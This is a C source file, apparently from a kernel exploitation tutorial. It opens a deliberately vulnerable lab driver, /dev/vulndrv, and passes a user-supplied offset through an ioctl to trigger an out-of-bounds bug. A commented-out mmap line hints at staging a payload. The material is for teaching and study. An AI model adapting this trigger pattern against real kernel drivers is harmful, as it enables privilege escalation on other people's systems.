/**
 * User-space trigger application for OOB in drv.c
 *
 *
 * Full article: https://cyseclabs.com/page?n=17012016
 *
 * Author: Vitaly Nikolenko
 * Email: vnik@cyseclabs.com
 *
 **/

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "drv.h"

#define DEVICE_PATH "/dev/vulndrv"

int main(int argc, char **argv) {
	int fd;
	struct drv_req req;

	req.offset = atoll(argv[1]);

	//map = mmap((void *)..., ..., 3, 0x32, 0, 0);

	fd = open(DEVICE_PATH, O_RDONLY);

	if (fd == -1) {
		perror("open");
	}

	ioctl(fd, 0, &req);

	return 0;
}
